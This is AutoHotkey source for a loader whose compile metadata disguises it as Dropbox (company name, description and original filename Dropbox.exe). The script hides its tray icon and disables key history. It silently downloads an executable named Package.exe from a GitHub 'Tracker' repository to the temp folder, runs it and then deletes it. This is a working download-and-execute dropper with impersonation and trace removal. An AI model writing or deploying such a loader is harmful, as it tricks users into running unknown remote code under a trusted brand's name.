/*
 * * * Compile_AHK SETTINGS BEGIN * * *

[AHK2EXE]
Exe_File=%In_Dir%\Loader.exe
No_UPX=1
Execution_Level=4
[VERSION]
Set_Version_Info=1
Company_Name=Dropbox, Inc.
File_Description=Dropbox
File_Version=0.0.4.0
Inc_File_Version=0
Legal_Copyright=Dropbox, Inc.
Original_Filename=Dropbox.exe
Product_Name=Dropbox
Product_Version=0.0.4.0
[ICONS]
Icon_2=0
Icon_3=0
Icon_4=0
Icon_5=0

* * * Compile_AHK SETTINGS END * * *
*/
;@Ahk2Exe-SetName Dropbox
;@Ahk2Exe-SetDescription Dropbox
;@Ahk2Exe-SetVersion 0.4
;@Ahk2Exe-SetCopyright Dropbox Inc
;@Ahk2Exe-SetOrigFileName Dropbox.exe
;@Ahk2Exe-SetCompanyName Dropbox Inc

#SingleInstance, Force
#NoEnv
#NoTrayIcon
#KeyHistory, 0
#Persistent
ListLines, Off
OnExit("Erase")

PackageURL := "https://github.com/Visionary1/Tracker/raw/master/v2/Package.exe"
Application := A_Temp . "\" . A_TickCount . ".exe"

UrlDownloadToFile, % PackageURL, % Application

If FileExist(Application)
{
	Try
		RunWait, % Application
	Catch e
		Erase()
	Finally
		Erase()
}
Return

Erase()
{
	global Application

	Try FileDelete, % Application
	ExitApp
}